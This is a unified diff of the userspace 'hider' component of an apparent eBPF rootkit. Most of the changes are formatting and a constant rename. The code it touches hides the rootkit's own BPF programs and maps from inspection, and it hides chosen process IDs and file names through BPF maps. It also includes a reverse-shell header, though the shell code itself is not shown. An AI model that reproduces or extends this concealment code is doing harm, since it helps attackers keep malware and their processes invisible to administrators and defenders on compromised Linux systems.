@@ -1,15 +1,16 @@
-#include <linux/types.h>
-#include <bpf/libbpf.h>
-#include <bpf/bpf.h>
-#include <unistd.h>
 #include <arpa/inet.h>
+#include <bpf/bpf.h>
+#include <bpf/libbpf.h>
+#include <linux/types.h>
+#include <unistd.h>
+
 #include "userspace/hider.h"
-#include "userspace/reverse_shell.h"
 #include "config.h"
 #include "rootkit.skel.h"
+#include "userspace/reverse_shell.h"
 
 static struct {
-    struct rootkit *skel;
+    struct rootkit* skel;
     int hide_names_map_fd;
     int hide_bpf_map_fd;
     int tracked_pids_map_fd;
@@ -22,14 +23,14 @@ static struct {
     .is_initialized = false,
 };
 
-static int update_string_map(int map_fd, const char *str_val)
+static int update_string_map(int map_fd, const char* str_val)
 {
     if (!g_hider.is_initialized || map_fd < 0 || !str_val)
         return -EINVAL;
 
-    char key[MAX_NAME_LEN] = { 0 };
+    char key[MAX_HIDDEN_FILE_NAME_LEN] = { 0 };
 
-    if (strlen(str_val) >= MAX_NAME_LEN)
+    if (strlen(str_val) >= MAX_HIDDEN_FILE_NAME_LEN)
         return -ENAMETOOLONG;
 
     snprintf(key, sizeof(key), "%s", str_val);
@@ -38,14 +39,14 @@ static int update_string_map(int map_fd, const char *str_val)
     return bpf_map_update_elem(map_fd, key, &value, BPF_ANY);
 }
 
-static int delete_string_map(int map_fd, const char *str_val)
+static int delete_string_map(int map_fd, const char* str_val)
 {
     if (!g_hider.is_initialized || map_fd < 0 || !str_val)
         return -EINVAL;
 
-    char key[MAX_NAME_LEN] = { 0 };
+    char key[MAX_HIDDEN_FILE_NAME_LEN] = { 0 };
 
-    if (strlen(str_val) >= MAX_NAME_LEN)
+    if (strlen(str_val) >= MAX_HIDDEN_FILE_NAME_LEN)
         return -ENAMETOOLONG;
 
     snprintf(key, sizeof(key), "%s", str_val);
@@ -67,11 +68,12 @@ static int hide_bpf_maps()
     if (!g_hider.is_initialized || !g_hider.skel->obj)
         return -EINVAL;
 
-    struct bpf_map *map = NULL;
+    struct bpf_map* map = NULL;
     int ret = 0;
 
-    bpf_object__for_each_map(map, g_hider.skel->obj) {
-        struct bpf_map_info info = {};
+    bpf_object__for_each_map(map, g_hider.skel->obj)
+    {
+        struct bpf_map_info info = { };
         uint32_t len = sizeof(info);
         int fd = bpf_map__fd(map);
 
@@ -91,11 +93,12 @@ static int hide_bpf_programs()
     if (!g_hider.is_initialized || !g_hider.skel->obj)
         return -EINVAL;
 
-    struct bpf_program *prog = NULL;
+    struct bpf_program* prog = NULL;
     int ret = 0;
 
-    bpf_object__for_each_program(prog, g_hider.skel->obj) {
-        struct bpf_prog_info info = {};
+    bpf_object__for_each_program(prog, g_hider.skel->obj)
+    {
+        struct bpf_prog_info info = { };
         uint32_t len = sizeof(info);
         int fd = bpf_program__fd(prog);
 
@@ -119,12 +122,12 @@ static int hide_bpf()
     ret = hide_bpf_programs();
     if (ret)
         return ret;
-    
+
     ret = hide_bpf_maps();
     return ret;
 }
 
-int hider_init(struct rootkit *skel)
+int hider_init(struct rootkit* skel)
 {
     if (!skel)
         return -EINVAL;
@@ -154,7 +157,7 @@ int hider_hide_pid(pid_t pid)
 
     int ret = 0;
 
-    char pid_str[MAX_NAME_LEN] = { 0 };
+    char pid_str[MAX_HIDDEN_FILE_NAME_LEN] = { 0 };
     snprintf(pid_str, sizeof(pid_str), "%d", pid);
 
     ret = update_string_map(g_hider.hide_names_map_fd, pid_str);
@@ -164,23 +167,23 @@ int hider_hide_pid(pid_t pid)
     return update_uint32_map(g_hider.tracked_pids_map_fd, (uint32_t)pid);
 }
 
-int hider_hide_file(const char *filename)
+int hider_hide_file(const char* filename)
 {
     return update_string_map(g_hider.hide_names_map_fd, filename);
 }
 
 int hider_unhide_pid(pid_t pid)
 {
-    if (pid <= 0) 
+    if (pid <= 0)
         return -EINVAL;
 
-    char pid_str[MAX_NAME_LEN] = { 0 };
+    char pid_str[MAX_HIDDEN_FILE_NAME_LEN] = { 0 };
     snprintf(pid_str, sizeof(pid_str), "%d", pid);
 
     return delete_string_map(g_hider.hide_names_map_fd, pid_str);
 }
 
-int hider_unhide_file(const char *filename)
+int hider_unhide_file(const char* filename)
 {
     return delete_string_map(g_hider.hide_names_map_fd, filename);
 }
